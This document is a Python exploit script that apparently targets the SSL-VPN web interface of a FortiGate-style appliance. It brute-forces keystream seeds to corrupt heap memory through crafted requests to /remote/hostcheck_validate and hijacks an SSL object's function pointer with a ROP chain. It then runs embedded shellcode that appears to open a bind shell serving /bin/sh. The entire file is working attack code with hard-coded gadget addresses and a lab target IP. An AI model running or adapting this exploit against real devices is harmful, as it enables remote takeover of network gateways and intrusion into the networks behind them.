import requests, struct, ssl, socket, socket, time
from hashlib import md5
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
#diagnose debug crashlog read

context = ssl.SSLContext()
context.verify_mode=ssl.CERT_NONE
context.options|=ssl.OP_NO_TLSv1_3


HOST=("192.168.211.132",7443)
BASEURL="https://{}:{}".format(*HOST)
PIVOT_mov_rax_rdi=0x02a20d10    # mov rax, rdi; ret;
PIVOT_sub_rax_650=0x01cfdb67    # sub rax, 0x650; ret;']
PIVOT_mov_rdi_rax=0x0289c7ee
PIVOT_mov_rsi_rdi=0x0098bec9
mprotect=0x0043f3d0
memcpy=0x0043f2d0
bss=0x04698ca0
pop_rdi=0x00c25455       # pop rdi; ret;
pop_rsi=0x00c2544a       # pop rsi; ret;
pop_rdx=0x0256e7ae       #pop rdx; ret;

def free_ssl(s):
  s.close()


#run a null byte
def gen_seeds_u8(salt, offset, val):
    value=struct.pack("<B", val)
    if val==0:
        return [(b'00bfbfbf', offset-1), (b'00bfbfbf', offset-1)]
    s = gen_seed_for_offset(salt, offset, value[0])
    return [(s,offset-2),(s,offset-1)]

def gen_seed_for_offset(salt, offset, value):
    for i in range(0xffffff):
        seed="00{0:06x}".format(i).encode()
        ks=gen_ks(salt, seed, offset+1)
        if int(ks[offset])==int(value):
            return seed    
    print("keystream search failed")
    return None

def gen_ks(salt, seed, size):
    magic=b'GCC is the GNU Compiler Collection.'
    k0=md5(salt+seed+magic).digest()
    ks=k0
    while len(ks)<size:
        k0=md5(k0).digest()
        ks+=k0
    return ks[:size]
 
def gen_enc_data(salt, seed, size, data):
    plaintext=struct.pack("<H", size) + data
    keystream = gen_ks(salt, seed, len(plaintext))
    ciphertext = bytes(x[0]^x[1] for x in zip(plaintext, keystream)).hex()
    return seed.decode()+ciphertext

def gen_seeds_u64(salt, offset, val):
    value=struct.pack("<Q", val)
    seeds=[]
    n=7
    for i in range(n,-1,-1):
        if value[i]!=0:
            s=gen_seed_for_offset(salt, offset+i, value[i])
            seeds.append((s, offset+i-1))
            seeds.append((s, offset+i-2))
        else:
            # save some time by skipping the brute force. the application will write a null terminator to buf[size]
            seeds.append((b'00bfbfbf', offset+i-1))
            seeds.append((b'00bfbfbf', offset+i-1))
    return seeds[::-1]

def create_ssl_conn():
    s=socket.create_connection(HOST, timeout=None)
    ss=context.wrap_socket(s)
    ssocks.append(ss)

def make_req(sess, salt, seed, reqsize, data=b''):
    payload=gen_enc_data(salt, seed, reqsize, data)
    payload="enc="+payload
    r=sess.post(BASEURL+"/remote/hostcheck_validate", headers={"content-type":"application/x-www-form-urlencoded"}, verify=False, data=payload)
    return r

def pad(d, n, c=b'\0') :  #c=b'\0'):
    return d+c*(n-len(d))

def padA(d, n, c=b'\xcc') :  #c=b'\0'):
    return d+c*(n-len(d))


def u64(x):
    return struct.pack("<Q", x)
def make_ropchain():
    # [1] memcpy(bss, rdi, 0x2000)
    rop =b''
    rop+=u64(PIVOT_mov_rsi_rdi)
    rop+=u64(0x0256e7ae)	# (2) pop rdx; ret;
    rop+=u64(0x2000)
    rop+=u64(0x02b9e1a3)	# (3) pop rdi; ret;
    rop+=u64(bss)
    rop+=u64(memcpy)
    
    # [2] mprotect(bss, 0x2000, 7)
    rop+=u64(0x02a858dc)	# (0) pop rdx; ret;
    rop+=u64(7)
    rop+=u64(0x00c2544a)	# (1) pop rsi; ret;
    rop+=u64(0x2000)
    rop+=u64(0x02b9e1a3)	# (2) pop rdi; ret;
    rop+=u64(bss)
    rop+=u64(mprotect)

    # [3] jump to shellcode
    rop+=u64(bss+0x7A)
    #sc=b'\x90'*8
    sc=b"\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"
    rop+=sc    
    # pad to size
    assert len(rop) < 0x650-1
    return rop

def exploit(ssocks):
    try:

        sc650=b''
        payload_size=0x2000-0x18-7
        payload =(b'\0'*8) + (b'A'*(0x1360-0x18-8-6))
        payload+=pad(sc650, 0x650)
        payload+=make_ropchain()
        payload =padA(payload, payload_size)
        sess=requests.Session()
        r=sess.get(BASEURL+"/remote/info", verify=False)
        salt=r.content.split(b"salt='")[1].split(b"'")[0]
        print("salt: "+salt.decode())

        ssl_offset=0x2000-0x18-4
        handshake_func=ssl_offset + 0x30
        in_init = ssl_offset+0x64


        # set rsp = *SSL
        PIVOT_1=0x00f62332          # 0x4141414141414141 push rdi; pop rsp; ret
        # rsp=*SSL+0x290
        PIVOT_2=0x0089e189          # add rsp, 0x270; pop rbx; pop r12; pop rbp; ret;

        PIVOT_rdi_rax=0x00289c7ee   # mov rdi, rax; lea rax, [rip + 0x1de3f28]; add rax, rdi; ret

        seeds=[]
        seeds.extend(gen_seeds_u64(salt, handshake_func,   PIVOT_1))
        seeds.extend(gen_seeds_u64(salt, ssl_offset+0x00,   PIVOT_2))
        
        seeds.extend(gen_seeds_u64(salt, ssl_offset+0x290,   PIVOT_mov_rax_rdi))
        seeds.extend(gen_seeds_u64(salt, ssl_offset+0x298,   PIVOT_sub_rax_650))
        seeds.extend(gen_seeds_u64(salt, ssl_offset+0x2a0,   PIVOT_rdi_rax))
        seeds.extend(gen_seeds_u64(salt, ssl_offset+0x2a8,   PIVOT_1))
        
        seeds.extend(gen_seeds_u8(salt, in_init, 1))

        for i in range(24): 
            create_ssl_conn()        
        ssocks[-2].send(b'A'*0x2001)    
        #free_ssl(ssocks[-2])


        for i in seeds:
                #print((i[0], hex(i[1]-ssl_offset)))
                make_req(sess, salt, i[0], i[1], payload)
        #ssocks[-1].send(b"\x00"*4)
    except requests.exceptions.ConnectionError: 
            print('Crash')

if __name__=="__main__":
    ssocks=[]
    for i in range(1):
        exploit(ssocks)